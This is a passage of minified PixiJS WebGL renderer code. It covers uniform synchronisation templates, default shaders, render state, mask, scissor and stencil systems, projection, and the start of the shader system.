8] = "+t+"_matrix[6];\n                data[offset + 9] = "+t+"_matrix[7];\n                data[offset + 10] = "+t+"_matrix[8];\n            "}},{test:function(t,e){return"vec2"===t.type&&1===t.size&&void 0!==e.x},code:function(t){return'\n                cv = ud["'+t+'"].value;\n                v = uv["'+t+'"];\n\n                if(cv[0] !== v.x || cv[1] !== v.y)\n                {\n                    cv[0] = v.x;\n                    cv[1] = v.y;\n                    gl.uniform2f(ud["'+t+'"].location, v.x, v.y);\n                }'},codeUbo:function(t){return"\n                v = uv."+t+";\n\n                data[offset] = v.x;\n                data[offset+1] = v.y;\n            "}},{test:function(t){return"vec2"===t.type&&1===t.size},code:function(t){return'\n                cv = ud["'+t+'"].value;\n                v = uv["'+t+'"];\n\n                if(cv[0] !== v[0] || cv[1] !== v[1])\n                {\n                    cv[0] = v[0];\n                    cv[1] = v[1];\n                    gl.uniform2f(ud["'+t+'"].location, v[0], v[1]);\n                }\n            '}},{test:function(t,e){return"vec4"===t.type&&1===t.size&&void 0!==e.width},code:function(t){return'\n                cv = ud["'+t+'"].value;\n                v = uv["'+t+'"];\n\n                if(cv[0] !== v.x || cv[1] !== v.y || cv[2] !== v.width || cv[3] !== v.height)\n                {\n                    cv[0] = v.x;\n                    cv[1] = v.y;\n                    cv[2] = v.width;\n                    cv[3] = v.height;\n                    gl.uniform4f(ud["'+t+'"].location, v.x, v.y, v.width, v.height)\n                }'},codeUbo:function(t){return"\n                    v = uv."+t+";\n\n                    data[offset] = v.x;\n                    data[offset+1] = v.y;\n                    data[offset+2] = v.width;\n                    data[offset+3] = v.height;\n                "}},{test:function(t){return"vec4"===t.type&&1===t.size},code:function(t){return'\n                cv = ud["'+t+'"].value;\n                v = uv["'+t+'"];\n\n                if(cv[0] !== v[0] || cv[1] !== v[1] || cv[2] !== v[2] || cv[3] !== v[3])\n                {\n                    cv[0] = v[0];\n                    cv[1] = v[1];\n                    cv[2] = v[2];\n                    cv[3] = v[3];\n\n                    gl.uniform4f(ud["'+t+'"].location, v[0], v[1], v[2], v[3])\n                }'}}],Jd={float:"\n    if (cv !== v)\n    {\n        cu.value = v;\n        gl.uniform1f(location, v);\n    }",vec2:"\n    if (cv[0] !== v[0] || cv[1] !== v[1])\n    {\n        cv[0] = v[0];\n        cv[1] = v[1];\n\n        gl.uniform2f(location, v[0], v[1])\n    }",vec3:"\n    if (cv[0] !== v[0] || cv[1] !== v[1] || cv[2] !== v[2])\n    {\n        cv[0] = v[0];\n        cv[1] = v[1];\n        cv[2] = v[2];\n\n        gl.uniform3f(location, v[0], v[1], v[2])\n    }",vec4:"\n    if (cv[0] !== v[0] || cv[1] !== v[1] || cv[2] !== v[2] || cv[3] !== v[3])\n    {\n        cv[0] = v[0];\n        cv[1] = v[1];\n        cv[2] = v[2];\n        cv[3] = v[3];\n\n        gl.uniform4f(location, v[0], v[1], v[2], v[3]);\n    }",int:"\n    if (cv !== v)\n    {\n        cu.value = v;\n\n        gl.uniform1i(location, v);\n    }",ivec2:"\n    if (cv[0] !== v[0] || cv[1] !== v[1])\n    {\n        cv[0] = v[0];\n        cv[1] = v[1];\n\n        gl.uniform2i(location, v[0], v[1]);\n    }",ivec3:"\n    if (cv[0] !== v[0] || cv[1] !== v[1] || cv[2] !== v[2])\n    {\n        cv[0] = v[0];\n        cv[1] = v[1];\n        cv[2] = v[2];\n\n        gl.uniform3i(location, v[0], v[1], v[2]);\n    }",ivec4:"\n    if (cv[0] !== v[0] || cv[1] !== v[1] || cv[2] !== v[2] || cv[3] !== v[3])\n    {\n        cv[0] = v[0];\n        cv[1] = v[1];\n        cv[2] = v[2];\n        cv[3] = v[3];\n\n        gl.uniform4i(location, v[0], v[1], v[2], v[3]);\n    }",uint:"\n    if (cv !== v)\n    {\n        cu.value = v;\n\n        gl.uniform1ui(location, v);\n    }",uvec2:"\n    if (cv[0] !== v[0] || cv[1] !== v[1])\n    {\n        cv[0] = v[0];\n        cv[1] = v[1];\n\n        gl.uniform2ui(location, v[0], v[1]);\n    }",uvec3:"\n    if (cv[0] !== v[0] || cv[1] !== v[1] || cv[2] !== v[2])\n    {\n        cv[0] = v[0];\n        cv[1] = v[1];\n        cv[2] = v[2];\n\n        gl.uniform3ui(location, v[0], v[1], v[2]);\n    }",uvec4:"\n    if (cv[0] !== v[0] || cv[1] !== v[1] || cv[2] !== v[2] || cv[3] !== v[3])\n    {\n        cv[0] = v[0];\n        cv[1] = v[1];\n        cv[2] = v[2];\n        cv[3] = v[3];\n\n        gl.uniform4ui(location, v[0], v[1], v[2], v[3]);\n    }",bool:"\n    if (cv !== v)\n    {\n        cu.value = v;\n        gl.uniform1i(location, v);\n    }",bvec2:"\n    if (cv[0] != v[0] || cv[1] != v[1])\n    {\n        cv[0] = v[0];\n        cv[1] = v[1];\n\n        gl.uniform2i(location, v[0], v[1]);\n    }",bvec3:"\n    if (cv[0] !== v[0] || cv[1] !== v[1] || cv[2] !== v[2])\n    {\n        cv[0] = v[0];\n        cv[1] = v[1];\n        cv[2] = v[2];\n\n        gl.uniform3i(location, v[0], v[1], v[2]);\n    }",bvec4:"\n    if (cv[0] !== v[0] || cv[1] !== v[1] || cv[2] !== v[2] || cv[3] !== v[3])\n    {\n        cv[0] = v[0];\n        cv[1] = v[1];\n        cv[2] = v[2];\n        cv[3] = v[3];\n\n        gl.uniform4i(location, v[0], v[1], v[2], v[3]);\n    }",mat2:"gl.uniformMatrix2fv(location, false, v)",mat3:"gl.uniformMatrix3fv(location, false, v)",mat4:"gl.uniformMatrix4fv(location, false, v)",sampler2D:"\n    if (cv !== v)\n    {\n        cu.value = v;\n\n        gl.uniform1i(location, v);\n    }",samplerCube:"\n    if (cv !== v)\n    {\n        cu.value = v;\n\n        gl.uniform1i(location, v);\n    }",sampler2DArray:"\n    if (cv !== v)\n    {\n        cu.value = v;\n\n        gl.uniform1i(location, v);\n    }"},tp={float:"gl.uniform1fv(location, v)",vec2:"gl.uniform2fv(location, v)",vec3:"gl.uniform3fv(location, v)",vec4:"gl.uniform4fv(location, v)",mat4:"gl.uniformMatrix4fv(location, false, v)",mat3:"gl.uniformMatrix3fv(location, false, v)",mat2:"gl.uniformMatrix2fv(location, false, v)",int:"gl.uniform1iv(location, v)",ivec2:"gl.uniform2iv(location, v)",ivec3:"gl.uniform3iv(location, v)",ivec4:"gl.uniform4iv(location, v)",uint:"gl.uniform1uiv(location, v)",uvec2:"gl.uniform2uiv(location, v)",uvec3:"gl.uniform3uiv(location, v)",uvec4:"gl.uniform4uiv(location, v)",bool:"gl.uniform1iv(location, v)",bvec2:"gl.uniform2iv(location, v)",bvec3:"gl.uniform3iv(location, v)",bvec4:"gl.uniform4iv(location, v)",sampler2D:"gl.uniform1iv(location, v)",samplerCube:"gl.uniform1iv(location, v)",sampler2DArray:"gl.uniform1iv(location, v)"},ep=["precision mediump float;","void main(void){","float test = 0.1;","%forloop%","gl_FragColor = vec4(0.0);","}"].join("\n");function ip(t){for(var e="",i=0;i<t;++i)i>0&&(e+="\nelse "),i<t-1&&(e+="if(test == "+i+".0){}");return e}var rp=0,np={},sp=function(){function t(e,i,r){void 0===r&&(r="pixi-shader"),this.id=rp++,this.vertexSrc=e||t.defaultVertexSrc,this.fragmentSrc=i||t.defaultFragmentSrc,this.vertexSrc=this.vertexSrc.trim(),this.fragmentSrc=this.fragmentSrc.trim(),"#version"!==this.vertexSrc.substring(0,8)&&(r=r.replace(/\s+/g,"-"),np[r]?(np[r]++,r+="-"+np[r]):np[r]=1,this.vertexSrc="#define SHADER_NAME "+r+"\n"+this.vertexSrc,this.fragmentSrc="#define SHADER_NAME "+r+"\n"+this.fragmentSrc,this.vertexSrc=jd(this.vertexSrc,Fl.PRECISION_VERTEX,dl.HIGH),this.fragmentSrc=jd(this.fragmentSrc,Fl.PRECISION_FRAGMENT,function(){if(!zd){zd=dl.MEDIUM;var t=function(){if(Xd===Vd||Xd&&Xd.isContextLost()){var t=Fl.ADAPTER.createCanvas(),e=void 0;Fl.PREFER_ENV>=Ku.WEBGL2&&(e=t.getContext("webgl2",{})),e||((e=t.getContext("webgl",{})||t.getContext("experimental-webgl",{}))?e.getExtension("WEBGL_draw_buffers"):e=null),Xd=e}return Xd}();if(t&&t.getShaderPrecisionFormat){var e=t.getShaderPrecisionFormat(t.FRAGMENT_SHADER,t.HIGH_FLOAT);zd=e.precision?dl.HIGH:dl.MEDIUM}}return zd}())),this.glPrograms={},this.syncUniforms=null}return Object.defineProperty(t,"defaultVertexSrc",{get:function(){return"attribute vec2 aVertexPosition;\nattribute vec2 aTextureCoord;\n\nuniform mat3 projectionMatrix;\n\nvarying vec2 vTextureCoord;\n\nvoid main(void){\n   gl_Position = vec4((projectionMatrix * vec3(aVertexPosition, 1.0)).xy, 0.0, 1.0);\n   vTextureCoord = aTextureCoord;\n}\n"},enumerable:!1,configurable:!0}),Object.defineProperty(t,"defaultFragmentSrc",{get:function(){return"varying vec2 vTextureCoord;\n\nuniform sampler2D uSampler;\n\nvoid main(void){\n   gl_FragColor *= texture2D(uSampler, vTextureCoord);\n}"},enumerable:!1,configurable:!0}),t.from=function(e,i,r){var n=e+i,s=rc[n];return s||(rc[n]=s=new t(e,i,r)),s},t}(),op=function(){function t(t,e){this.uniformBindCount=0,this.program=t,this.uniformGroup=e?e instanceof Td?e:new Td(e):new Td({})}return t.prototype.checkUniformExists=function(t,e){if(e.uniforms[t])return!0;for(var i in e.uniforms){var r=e.uniforms[i];if(r.group&&this.checkUniformExists(t,r))return!0}return!1},t.prototype.destroy=function(){this.uniformGroup=null},Object.defineProperty(t.prototype,"uniforms",{get:function(){return this.uniformGroup.uniforms},enumerable:!1,configurable:!0}),t.from=function(e,i,r){return new t(sp.from(e,i),r)},t}(),ap=function(){function t(){this.data=0,this.blendMode=tl.NORMAL,this.polygonOffset=0,this.blend=!0,this.depthMask=!0}return Object.defineProperty(t.prototype,"blend",{get:function(){return!!(1&this.data)},set:function(t){!!(1&this.data)!==t&&(this.data^=1)},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"offsets",{get:function(){return!!(2&this.data)},set:function(t){!!(2&this.data)!==t&&(this.data^=2)},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"culling",{get:function(){return!!(4&this.data)},set:function(t){!!(4&this.data)!==t&&(this.data^=4)},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"depthTest",{get:function(){return!!(8&this.data)},set:function(t){!!(8&this.data)!==t&&(this.data^=8)},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"depthMask",{get:function(){return!!(32&this.data)},set:function(t){!!(32&this.data)!==t&&(this.data^=32)},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"clockwiseFrontFace",{get:function(){return!!(16&this.data)},set:function(t){!!(16&this.data)!==t&&(this.data^=16)},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"blendMode",{get:function(){return this._blendMode},set:function(t){this.blend=t!==tl.NONE,this._blendMode=t},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"polygonOffset",{get:function(){return this._polygonOffset},set:function(t){this.offsets=!!t,this._polygonOffset=t},enumerable:!1,configurable:!0}),t.prototype.toString=function(){return"[@pixi/core:State blendMode="+this.blendMode+" clockwiseFrontFace="+this.clockwiseFrontFace+" culling="+this.culling+" depthMask="+this.depthMask+" polygonOffset="+this.polygonOffset+"]"},t.for2d=function(){var e=new t;return e.depthTest=!1,e.blend=!0,e},t}(),hp=function(t){function e(i,r,n){var s=this,o=sp.from(i||e.defaultVertexSrc,r||e.defaultFragmentSrc);return(s=t.call(this,o,n)||this).padding=0,s.resolution=Fl.FILTER_RESOLUTION,s.multisample=Fl.FILTER_MULTISAMPLE,s.enabled=!0,s.autoFit=!0,s.state=new ap,s}return Hc(e,t),e.prototype.apply=function(t,e,i,r,n){t.applyFilter(this,e,i,r)},Object.defineProperty(e.prototype,"blendMode",{get:function(){return this.state.blendMode},set:function(t){this.state.blendMode=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"resolution",{get:function(){return this._resolution},set:function(t){this._resolution=t},enumerable:!1,configurable:!0}),Object.defineProperty(e,"defaultVertexSrc",{get:function(){return"attribute vec2 aVertexPosition;\n\nuniform mat3 projectionMatrix;\n\nvarying vec2 vTextureCoord;\n\nuniform vec4 inputSize;\nuniform vec4 outputFrame;\n\nvec4 filterVertexPosition( void )\n{\n    vec2 position = aVertexPosition * max(outputFrame.zw, vec2(0.)) + outputFrame.xy;\n\n    return vec4((projectionMatrix * vec3(position, 1.0)).xy, 0.0, 1.0);\n}\n\nvec2 filterTextureCoord( void )\n{\n    return aVertexPosition * (outputFrame.zw * inputSize.zw);\n}\n\nvoid main(void)\n{\n    gl_Position = filterVertexPosition();\n    vTextureCoord = filterTextureCoord();\n}\n"},enumerable:!1,configurable:!0}),Object.defineProperty(e,"defaultFragmentSrc",{get:function(){return"varying vec2 vTextureCoord;\n\nuniform sampler2D uSampler;\n\nvoid main(void){\n   gl_FragColor = texture2D(uSampler, vTextureCoord);\n}\n"},enumerable:!1,configurable:!0}),e}(op),up=new Cc,lp=function(){function t(t,e){this._texture=t,this.mapCoord=new Cc,this.uClampFrame=new Float32Array(4),this.uClampOffset=new Float32Array(2),this._textureID=-1,this._updateID=0,this.clampOffset=0,this.clampMargin=void 0===e?.5:e,this.isSimple=!1}return Object.defineProperty(t.prototype,"texture",{get:function(){return this._texture},set:function(t){this._texture=t,this._textureID=-1},enumerable:!1,configurable:!0}),t.prototype.multiplyUvs=function(t,e){void 0===e&&(e=t);for(var i=this.mapCoord,r=0;r<t.length;r+=2){var n=t[r],s=t[r+1];e[r]=n*i.a+s*i.c+i.tx,e[r+1]=n*i.b+s*i.d+i.ty}return e},t.prototype.update=function(t){var e=this._texture;if(!e||!e.valid)return!1;if(!t&&this._textureID===e._updateID)return!1;this._textureID=e._updateID,this._updateID++;var i=e._uvs;this.mapCoord.set(i.x1-i.x0,i.y1-i.y0,i.x3-i.x0,i.y3-i.y0,i.x0,i.y0);var r=e.orig,n=e.trim;n&&(up.set(r.width/n.width,0,0,r.height/n.height,-n.x/n.width,-n.y/n.height),this.mapCoord.append(up));var s=e.baseTexture,o=this.uClampFrame,a=this.clampMargin/s.resolution,h=this.clampOffset;return o[0]=(e._frame.x+a+h)/s.width,o[1]=(e._frame.y+a+h)/s.height,o[2]=(e._frame.x+e._frame.width-a+h)/s.width,o[3]=(e._frame.y+e._frame.height-a+h)/s.height,this.uClampOffset[0]=h/s.realWidth,this.uClampOffset[1]=h/s.realHeight,this.isSimple=e._frame.width===s.width&&e._frame.height===s.height&&0===e.rotate,!0},t}(),cp=function(t){function e(e,i,r){var n=this,s=null;return"string"!=typeof e&&void 0===i&&void 0===r&&(s=e,e=void 0,i=void 0,r=void 0),(n=t.call(this,e||"attribute vec2 aVertexPosition;\nattribute vec2 aTextureCoord;\n\nuniform mat3 projectionMatrix;\nuniform mat3 otherMatrix;\n\nvarying vec2 vMaskCoord;\nvarying vec2 vTextureCoord;\n\nvoid main(void)\n{\n    gl_Position = vec4((projectionMatrix * vec3(aVertexPosition, 1.0)).xy, 0.0, 1.0);\n\n    vTextureCoord = aTextureCoord;\n    vMaskCoord = ( otherMatrix * vec3( aTextureCoord, 1.0)  ).xy;\n}\n",i||"varying vec2 vMaskCoord;\nvarying vec2 vTextureCoord;\n\nuniform sampler2D uSampler;\nuniform sampler2D mask;\nuniform float alpha;\nuniform float npmAlpha;\nuniform vec4 maskClamp;\n\nvoid main(void)\n{\n    float clip = step(3.5,\n        step(maskClamp.x, vMaskCoord.x) +\n        step(maskClamp.y, vMaskCoord.y) +\n        step(vMaskCoord.x, maskClamp.z) +\n        step(vMaskCoord.y, maskClamp.w));\n\n    vec4 original = texture2D(uSampler, vTextureCoord);\n    vec4 masky = texture2D(mask, vMaskCoord);\n    float alphaMul = 1.0 - npmAlpha * (1.0 - masky.a);\n\n    original *= (alphaMul * masky.r * alpha * clip);\n\n    gl_FragColor = original;\n}\n",r)||this).maskSprite=s,n.maskMatrix=new Cc,n}return Hc(e,t),Object.defineProperty(e.prototype,"maskSprite",{get:function(){return this._maskSprite},set:function(t){this._maskSprite=t,this._maskSprite&&(this._maskSprite.renderable=!1)},enumerable:!1,configurable:!0}),e.prototype.apply=function(t,e,i,r){var n=this._maskSprite,s=n._texture;s.valid&&(s.uvMatrix||(s.uvMatrix=new lp(s,0)),s.uvMatrix.update(),this.uniforms.npmAlpha=s.baseTexture.alphaMode?0:1,this.uniforms.mask=s,this.uniforms.otherMatrix=t.calculateSpriteMatrix(this.maskMatrix,n).prepend(s.uvMatrix.mapCoord),this.uniforms.alpha=n.worldAlpha,this.uniforms.maskClamp=s.uvMatrix.uClampFrame,t.applyFilter(this,e,i,r))},e}(hp),dp=function(){function t(t){this.renderer=t,this.enableScissor=!0,this.alphaMaskPool=[],this.maskDataPool=[],this.maskStack=[],this.alphaMaskIndex=0}return t.prototype.setMaskStack=function(t){this.maskStack=t,this.renderer.scissor.setMaskStack(t),this.renderer.stencil.setMaskStack(t)},t.prototype.push=function(t,e){var i=e;if(!i.isMaskData){var r=this.maskDataPool.pop()||new Bd;r.pooled=!0,r.maskObject=e,i=r}var n=0!==this.maskStack.length?this.maskStack[this.maskStack.length-1]:null;if(i.copyCountersOrReset(n),i._colorMask=n?n._colorMask:15,i.autoDetect&&this.detect(i),i._target=t,i.type!==pl.SPRITE&&this.maskStack.push(i),i.enabled)switch(i.type){case pl.SCISSOR:this.renderer.scissor.push(i);break;case pl.STENCIL:this.renderer.stencil.push(i);break;case pl.SPRITE:i.copyCountersOrReset(null),this.pushSpriteMask(i);break;case pl.COLOR:this.pushColorMask(i)}i.type===pl.SPRITE&&this.maskStack.push(i)},t.prototype.pop=function(t){var e=this.maskStack.pop();if(e&&e._target===t){if(e.enabled)switch(e.type){case pl.SCISSOR:this.renderer.scissor.pop(e);break;case pl.STENCIL:this.renderer.stencil.pop(e.maskObject);break;case pl.SPRITE:this.popSpriteMask(e);break;case pl.COLOR:this.popColorMask(e)}if(e.reset(),e.pooled&&this.maskDataPool.push(e),0!==this.maskStack.length){var i=this.maskStack[this.maskStack.length-1];i.type===pl.SPRITE&&i._filters&&(i._filters[0].maskSprite=i.maskObject)}}},t.prototype.detect=function(t){var e=t.maskObject;e?e.isSprite?t.type=pl.SPRITE:this.enableScissor&&this.renderer.scissor.testScissor(t)?t.type=pl.SCISSOR:t.type=pl.STENCIL:t.type=pl.COLOR},t.prototype.pushSpriteMask=function(t){var e,i,r=t.maskObject,n=t._target,s=t._filters;s||(s=this.alphaMaskPool[this.alphaMaskIndex])||(s=this.alphaMaskPool[this.alphaMaskIndex]=[new cp]);var o,a,h=this.renderer,u=h.renderTexture;if(u.current){var l=u.current;o=t.resolution||l.resolution,a=null!==(e=t.multisample)&&void 0!==e?e:l.multisample}else o=t.resolution||h.resolution,a=null!==(i=t.multisample)&&void 0!==i?i:h.multisample;s[0].resolution=o,s[0].multisample=a,s[0].maskSprite=r;var c=n.filterArea;n.filterArea=r.getBounds(!0),h.filter.push(n,s),n.filterArea=c,t._filters||this.alphaMaskIndex++},t.prototype.popSpriteMask=function(t){this.renderer.filter.pop(),t._filters?t._filters[0].maskSprite=null:(this.alphaMaskIndex--,this.alphaMaskPool[this.alphaMaskIndex][0].maskSprite=null)},t.prototype.pushColorMask=function(t){var e=t._colorMask,i=t._colorMask=e&t.colorMask;i!==e&&this.renderer.gl.colorMask(0!=(1&i),0!=(2&i),0!=(4&i),0!=(8&i))},t.prototype.popColorMask=function(t){var e=t._colorMask,i=this.maskStack.length>0?this.maskStack[this.maskStack.length-1]._colorMask:15;i!==e&&this.renderer.gl.colorMask(0!=(1&i),0!=(2&i),0!=(4&i),0!=(8&i))},t.prototype.destroy=function(){this.renderer=null},t}(),pp=function(){function t(t){this.renderer=t,this.maskStack=[],this.glConst=0}return t.prototype.getStackLength=function(){return this.maskStack.length},t.prototype.setMaskStack=function(t){var e=this.renderer.gl,i=this.getStackLength();this.maskStack=t;var r=this.getStackLength();r!==i&&(0===r?e.disable(this.glConst):(e.enable(this.glConst),this._useCurrent()))},t.prototype._useCurrent=function(){},t.prototype.destroy=function(){this.renderer=null,this.maskStack=null},t}(),fp=new Cc,gp=[],mp=function(t){function e(e){var i=t.call(this,e)||this;return i.glConst=Fl.ADAPTER.getWebGLRenderingContext().SCISSOR_TEST,i}return Hc(e,t),e.prototype.getStackLength=function(){var t=this.maskStack[this.maskStack.length-1];return t?t._scissorCounter:0},e.prototype.calcScissorRect=function(t){var e;if(!t._scissorRectLocal){var i=t._scissorRect,r=t.maskObject,n=this.renderer,s=n.renderTexture,o=r.getBounds(!0,null!==(e=gp.pop())&&void 0!==e?e:new bc);this.roundFrameToPixels(o,s.current?s.current.resolution:n.resolution,s.sourceFrame,s.destinationFrame,n.projection.transform),i&&o.fit(i),t._scissorRectLocal=o}},e.isMatrixRotated=function(t){if(!t)return!1;var e=t.a,i=t.b,r=t.c,n=t.d;return(Math.abs(i)>1e-4||Math.abs(r)>1e-4)&&(Math.abs(e)>1e-4||Math.abs(n)>1e-4)},e.prototype.testScissor=function(t){var i=t.maskObject;if(!i.isFastRect||!i.isFastRect())return!1;if(e.isMatrixRotated(i.worldTransform))return!1;if(e.isMatrixRotated(this.renderer.projection.transform))return!1;this.calcScissorRect(t);var r=t._scissorRectLocal;return r.width>0&&r.height>0},e.prototype.roundFrameToPixels=function(t,i,r,n,s){e.isMatrixRotated(s)||((s=s?fp.copyFrom(s):fp.identity()).translate(-r.x,-r.y).scale(n.width/r.width,n.height/r.height).translate(n.x,n.y),this.renderer.filter.transformAABB(s,t),t.fit(n),t.x=Math.round(t.x*i),t.y=Math.round(t.y*i),t.width=Math.round(t.width*i),t.height=Math.round(t.height*i))},e.prototype.push=function(t){t._scissorRectLocal||this.calcScissorRect(t);var e=this.renderer.gl;t._scissorRect||e.enable(e.SCISSOR_TEST),t._scissorCounter++,t._scissorRect=t._scissorRectLocal,this._useCurrent()},e.prototype.pop=function(t){var e=this.renderer.gl;t&&gp.push(t._scissorRectLocal),this.getStackLength()>0?this._useCurrent():e.disable(e.SCISSOR_TEST)},e.prototype._useCurrent=function(){var t,e=this.maskStack[this.maskStack.length-1]._scissorRect;t=this.renderer.renderTexture.current?e.y:this.renderer.height-e.height-e.y,this.renderer.gl.scissor(e.x,t,e.width,e.height)},e}(pp),vp=function(t){function e(e){var i=t.call(this,e)||this;return i.glConst=Fl.ADAPTER.getWebGLRenderingContext().STENCIL_TEST,i}return Hc(e,t),e.prototype.getStackLength=function(){var t=this.maskStack[this.maskStack.length-1];return t?t._stencilCounter:0},e.prototype.push=function(t){var e=t.maskObject,i=this.renderer.gl,r=t._stencilCounter;0===r&&(this.renderer.framebuffer.forceStencil(),i.clearStencil(0),i.clear(i.STENCIL_BUFFER_BIT),i.enable(i.STENCIL_TEST)),t._stencilCounter++;var n=t._colorMask;0!==n&&(t._colorMask=0,i.colorMask(!1,!1,!1,!1)),i.stencilFunc(i.EQUAL,r,4294967295),i.stencilOp(i.KEEP,i.KEEP,i.INCR),e.renderable=!0,e.render(this.renderer),this.renderer.batch.flush(),e.renderable=!1,0!==n&&(t._colorMask=n,i.colorMask(0!=(1&n),0!=(2&n),0!=(4&n),0!=(8&n))),this._useCurrent()},e.prototype.pop=function(t){var e=this.renderer.gl;if(0===this.getStackLength())e.disable(e.STENCIL_TEST);else{var i=0!==this.maskStack.length?this.maskStack[this.maskStack.length-1]:null,r=i?i._colorMask:15;0!==r&&(i._colorMask=0,e.colorMask(!1,!1,!1,!1)),e.stencilOp(e.KEEP,e.KEEP,e.DECR),t.renderable=!0,t.render(this.renderer),this.renderer.batch.flush(),t.renderable=!1,0!==r&&(i._colorMask=r,e.colorMask(0!=(1&r),0!=(2&r),0!=(4&r),0!=(8&r))),this._useCurrent()}},e.prototype._useCurrent=function(){var t=this.renderer.gl;t.stencilFunc(t.EQUAL,this.getStackLength(),4294967295),t.stencilOp(t.KEEP,t.KEEP,t.KEEP)},e}(pp),_p=function(){function t(t){this.renderer=t,this.destinationFrame=null,this.sourceFrame=null,this.defaultFrame=null,this.projectionMatrix=new Cc,this.transform=null}return t.prototype.update=function(t,e,i,r){this.destinationFrame=t||this.destinationFrame||this.defaultFrame,this.sourceFrame=e||this.sourceFrame||t,this.calculateProjection(this.destinationFrame,this.sourceFrame,i,r),this.transform&&this.projectionMatrix.append(this.transform);var n=this.renderer;n.globalUniforms.uniforms.projectionMatrix=this.projectionMatrix,n.globalUniforms.update(),n.shader.shader&&n.shader.syncUniformGroup(n.shader.shader.uniforms.globals)},t.prototype.calculateProjection=function(t,e,i,r){var n=this.projectionMatrix,s=r?-1:1;n.identity(),n.a=1/e.width*2,n.d=s*(1/e.height*2),n.tx=-1-e.x*n.a,n.ty=-s-e.y*n.d},t.prototype.setTransform=function(t){},t.prototype.destroy=function(){this.renderer=null},t}(),yp=new bc,xp=new bc,Ep=function(){function t(t){this.renderer=t,this.clearColor=t._backgroundColorRgba,this.defaultMaskStack=[],this.current=null,this.sourceFrame=new bc,this.destinationFrame=new bc,this.viewportFrame=new bc}return t.prototype.bind=function(t,e,i){void 0===t&&(t=null);var r,n,s,o=this.renderer;this.current=t,t?(s=(r=t.baseTexture).resolution,e||(yp.width=t.frame.width,yp.height=t.frame.height,e=yp),i||(xp.x=t.frame.x,xp.y=t.frame.y,xp.width=e.width,xp.height=e.height,i=xp),n=r.framebuffer):(s=o.resolution,e||(yp.width=o.screen.width,yp.height=o.screen.height,e=yp),i||((i=yp).width=e.width,i.height=e.height));var a=this.viewportFrame;a.x=i.x*s,a.y=i.y*s,a.width=i.width*s,a.height=i.height*s,t||(a.y=o.view.height-(a.y+a.height)),a.ceil(),this.renderer.framebuffer.bind(n,a),this.renderer.projection.update(i,e,s,!n),t?this.renderer.mask.setMaskStack(r.maskStack):this.renderer.mask.setMaskStack(this.defaultMaskStack),this.sourceFrame.copyFrom(e),this.destinationFrame.copyFrom(i)},t.prototype.clear=function(t,e){t=this.current?t||this.current.baseTexture.clearColor:t||this.clearColor;var i=this.destinationFrame,r=this.current?this.current.baseTexture:this.renderer.screen,n=i.width!==r.width||i.height!==r.height;if(n){var s=this.viewportFrame,o=s.x,a=s.y,h=s.width,u=s.height;o=Math.round(o),a=Math.round(a),h=Math.round(h),u=Math.round(u),this.renderer.gl.enable(this.renderer.gl.SCISSOR_TEST),this.renderer.gl.scissor(o,a,h,u)}this.renderer.framebuffer.clear(t[0],t[1],t[2],t[3],e),n&&this.renderer.scissor.pop()},t.prototype.resize=function(){this.bind(null)},t.prototype.reset=function(){this.bind(null)},t.prototype.destroy=function(){this.renderer=null},t}();function bp(t,e,i,r,n){i.buffer.update(n)}var Tp={float:"\n        data[offset] = v;\n    ",vec2:"\n        data[offset] = v[0];\n        data[offset+1] = v[1];\n    ",vec3:"\n        data[offset] = v[0];\n        data[offset+1] = v[1];\n        data[offset+2] = v[2];\n\n    ",vec4:"\n        data[offset] = v[0];\n        data[offset+1] = v[1];\n        data[offset+2] = v[2];\n        data[offset+3] = v[3];\n    ",mat2:"\n        data[offset] = v[0];\n        data[offset+1] = v[1];\n\n        data[offset+4] = v[2];\n        data[offset+5] = v[3];\n    ",mat3:"\n        data[offset] = v[0];\n        data[offset+1] = v[1];\n        data[offset+2] = v[2];\n\n        data[offset + 4] = v[3];\n        data[offset + 5] = v[4];\n        data[offset + 6] = v[5];\n\n        data[offset + 8] = v[6];\n        data[offset + 9] = v[7];\n        data[offset + 10] = v[8];\n    ",mat4:"\n        for(var i = 0; i < 16; i++)\n        {\n            data[offset + i] = v[i];\n        }\n    "},Dp={float:4,vec2:8,vec3:12,vec4:16,int:4,ivec2:8,ivec3:12,ivec4:16,uint:4,uvec2:8,uvec3:12,uvec4:16,bool:4,bvec2:8,bvec3:12,bvec4:16,mat2:32,mat3:48,mat4:64},wp=function(){function t(t,e){this.program=t,this.uniformData=e,this.uniformGroups={},this.uniformDirtyGroups={},this.uniformBufferBindings={}}return t.prototype.destroy=function(){this.uniformData=null,this.uniformGroups=null,this.uniformDirtyGroups=null,this.uniformBufferBindings=null,this.program=null},t}(),Sp=0,Ap={textureCount:0,uboCount:0},Cp=function(){function t(t){this.destroyed=!1,this.renderer=t,this.systemCheck(),this.gl=null,this.shader=null,this.program=null,this.cache={},this._uboCache={},this.id=Sp++}return t.prototype.systemCheck=function(){if(!function(){if("boolean"==typeof Kd)return Kd;try{var t=new Function("param1","param2","param3","return param1[param2] === param3;");Kd=!0===t({a:"b"},"a","b")}catch(t){Kd=!1}return Kd}())throw new Error("Current environment does not allow unsafe-eval, please use @pixi/unsafe-eval module to enable support.")},t.prototype.contextChange=function(t){this.gl=t,this.reset()},t.prototype.bind=function(t,e){t.uniforms.globals=this.renderer.globalUniforms;var i=t.program,r=i.glPrograms[this.renderer.CONTEXT_UID]||this.generateProgram(t);return this.shader=t,this.program!==i&&(this.program=i,this.gl.useProgram(r.program)),e||(Ap.textureCount=0,Ap.uboCount=0,this.syncUniformGroup(t.uniformGroup,Ap)),r},t.prototype.setUniforms=function(t){var e=this.shader.program,i=e.glPrograms[this.renderer.CONTEXT_UID];e.syncUniforms(i.uniformData,t,this.renderer)},t.prototype.syncUniformGroup=function(t,e){var i=this.getGlProgram();t.static&&t.dirtyId===i.uniformDirtyGroups[t.id]||(i.uniformDirtyGroups[t.id]=t.dirtyId,this.syncUniforms(t,i,e))},t.prototype.syncUniforms=function(t,e,i){(t.syncUniforms[this.shader.program.id]||this.createSyncGroups(t))(e.uniformData,t.uniforms,this.renderer,i)},t.prototype.createSyncGroups=function(t){var e=this.getSignature(t,this.shader.program.uniformData,"u");return 